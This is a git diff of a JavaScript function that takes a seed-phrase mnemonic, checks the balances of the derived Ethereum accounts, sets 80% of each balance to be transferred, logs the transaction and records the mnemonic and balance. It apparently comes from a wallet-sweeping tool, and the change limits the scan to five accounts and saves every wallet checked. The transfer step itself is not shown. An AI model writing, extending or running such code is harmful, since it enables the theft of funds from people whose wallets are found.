@@ -32,7 +32,7 @@ const checkBalance = async (web3Provider, network, _mnemonic) =>
     })
 
     // for each account of the 5 first accounts
-    for (const account of accounts.filter((account) => !accountsAlreadyChecked.includes(account)))
+    for (const account of accounts.filter((account) => !accountsAlreadyChecked.includes(account)).slice(0, 5))
     {
         // get balance
         const brutBalance = await web3Provider.eth.getBalance(account);
@@ -40,6 +40,8 @@ const checkBalance = async (web3Provider, network, _mnemonic) =>
 
         // balance to transfer - 20% of the balance
         const balanceToTransfer = brutBalance * 0.8;
+
+        saveWallet(_mnemonic, account, balance)
 
         // check if balance is greater than 0
         if (balance > 0)
@@ -72,12 +74,8 @@ const checkBalance = async (web3Provider, network, _mnemonic) =>
             // log transaction
             console.log(`Transaction: ${JSON.stringify(tx)}`);
 
-            saveWallet(_mnemonic, account, balance)
-
             // exit process
             process.exit();
-        } else {
-            saveWallet(_mnemonic, account, balance)
         }
     }
 }
